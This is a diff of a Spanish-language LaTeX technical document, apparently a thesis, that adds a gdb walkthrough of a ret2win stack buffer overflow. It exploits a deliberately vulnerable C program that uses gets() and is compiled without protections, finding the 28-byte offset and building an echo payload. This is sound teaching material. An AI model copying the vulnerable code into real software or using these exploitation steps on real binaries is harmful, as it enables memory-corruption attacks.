@@ -37,12 +37,12 @@ Las dependencias del sistema necesarias para trabajar con el proyecto son las si
 
 Las librerías de Python, se pueden instalar de forma automática mediante el gestor de paquetes `Poetry', para ello dentro del repositorio del proyecto, nos colocaremos en la carpeta `src' y podemos ejecutar dos comandos diferentes para conseguir el mismo objetivo, cualquiera de los dos instalará las dependencias necesarias a nivel de Python.
 
-\begin{lstlisting}[language=bash]
+\begin{lstlisting}[language=bash, caption=Instalacion de dependencias Python]
 # Usando el fichero Makefile
-make init
+$ make init
 
 # Comando manual de Poetry
-poetry install
+$ poetry install
 \end{lstlisting}
 
 \subsection{Explicación del sistema AST}
@@ -299,7 +299,7 @@ void ret2win(){
 }
 
 void funcion_vulnerable(){
-    char buffer[128];
+    char buffer[16];
     printf("Dime algo: ");
     gets(buffer);
     printf("\nHas escrito: %s", buffer);
@@ -318,8 +318,91 @@ Es probable que compilando el código tal y como está el compilador nos arroje 
 Estas mitigaciones se explican en el punto \ref{subsec:mitigaciones}.
 Para probar el la explotación antes descrita necesitamos compilar el binario con el siguiente comando:
 \begin{lstlisting}[language=bash, caption=Compilado de código con pocas mitigaciones y arquitectura 32bit]
-gcc -m32 -no-pie -fno-stack-protector -o ret2win.o ret2win.c
+$ gcc -m32 -no-pie -fno-stack-protector -o ret2win.o ret2win.c
 \end{lstlisting}
+Una vez compilado, para probar la explotación del binario, lo ejecutaremos con el programa \acrfull{gdb}.
+Para la explotación se puede usar el siguiente tutorial como referencia:
+\begin{lstlisting}[language=bash, caption=Explotación de GDB con binario ret2win]
+# Se carga el binario en gdb
+$ gdb ret2win.o
+# Se establece el breakpoint en la funcion main
+(gdb) b main
+Breakpoint 1 at 0x8049209
+# Se establece el breakpoint en la funcion "funcion_vulnerable"
+(gdb) b funcion_vulnerable
+Breakpoint 2 at 0x80491c5
+# Se establece el breakpoint en la funcion "ret2win"
+(gdb) b ret2win
+Breakpoint 3 at 0x80491ac
+# Procedemos a ejecutar el programa y alcanzamos la funcion main
+(gdb) start
+Breakpoint 1, 0x08049209 in main ()
+# Podemos ver los stack frames usando backtrace
+(gdb) backtrace
+0  0x08049209 in main ()
+# Continuamos hasta funcion_vulnerable
+(gdb) continue
+Breakpoint 2, 0x080491c5 in funcion_vulnerable ()
+# Revisamos los stack frames para observar que hemos cambiado a uno nuevo
+(gdb) backtrace
+0  0x080491c5 in funcion_vulnerable ()
+1  0x08049221 in main ()
+# Continuamos instruccion por instruccion hasta que nos pida un input usando next
+(gdb) next instruction
+.
+.
+.
+(gdb) next instruction
+Dime algo: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# Introducimos un texto largo, de 48 As por ejemplo
+0x080491e1 in funcion_vulnerable ()
+(gdb) backtrace
+0  0x080491e1 in funcion_vulnerable ()
+1  0x41414141 in ?? ()
+2  0x41414141 in ?? ()
+3  0x41414141 in ?? ()
+4  0x41414141 in ?? ()
+5  0x41414141 in ?? ()
+6  0x00000000 in ?? ()
+# Como se puede observar, se ha sustituido el EIP cambiando el punto de retorno de la funcion.
+# Para obtener el exacto con precision, se puede hacer uso de herramientas automaticas, existe una online en la siguiente URL: https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+# Se genera un string de 48 bytes de longitud usando la herramienta (Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5)
+# Se reinicia el programa usando run y aceptando
+(gdb) run
+# Se repiten los pasos anteriores, sin embargo, se cambian las As introducidas por el texto generado en la herramienta
+(gdb) next instruction
+Dime algo: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
+# Revisamos el backtrace para ver el EIP
+(gdb) backtrace
+0  0x080491e1 in funcion_vulnerable ()
+1  0x62413961 in ?? ()
+2  0x31624130 in ?? ()
+3  0x41326241 in ?? ()
+4  0x62413362 in ?? ()
+5  0x35624134 in ?? ()
+6  0x00000000 in ?? ()
+# Se toma la funcion de retorno del punto 1 (0x62413961) y se introduce en la herramienta usada, obteniendo un offset de 28 bytes
+# Como conclusion, se debe entregar al programa 28 caracteres seguido de la funcion donde se quiera que retorne (ret2win)
+# Para ello se usa info address ret2win  y devuelve 0x80491a6
+# Para que el programa entienda esa direccion de memoria, se necesita pasarlo en formato bytes
+# Ademas dependiendo del endianness (Forma en la que lee las variables el binario), se necesita cambiar el orden
+# En este caso (y en la gran mayoria) se usa little endian, se puede revisar usando show endian, por lo cual el valor que se debe pasar al programa es (0xa6910408)
+# Se puede crear el payload usando bash con el siguiente comando: echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa6\x91\x04\x08" > payload.txt
+# Por ultimo, se carga como entrada al binario
+$ echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa6\x91\x04\x08" > payload.txt
+(gdb) run < payload.txt
+# Continuamos
+(gdb) c
+(gdb) c
+Continuing.
+Dime algo: 
+
+Breakpoint 3, 0x080491ac in ret2win ()
+# Buffer overflow conseguido, estamos en la funcion ret2win
+\end{lstlisting}
+
+Con esta prueba de concepto, se puede entender el peligro de un \acrshort{bof}.
+Aunque en esta demostración se tuviera una función `ret2win' que permite ejecutar una consola, hay otras técnicas que permiten llegar al mismo punto mediante librerías comunes como \acrshort{libc}.
 
 \subsection{Mitigaciones introducidas en el compilado} \label{subsec:mitigaciones}
 \subsection{Evasión de mitigaciones}
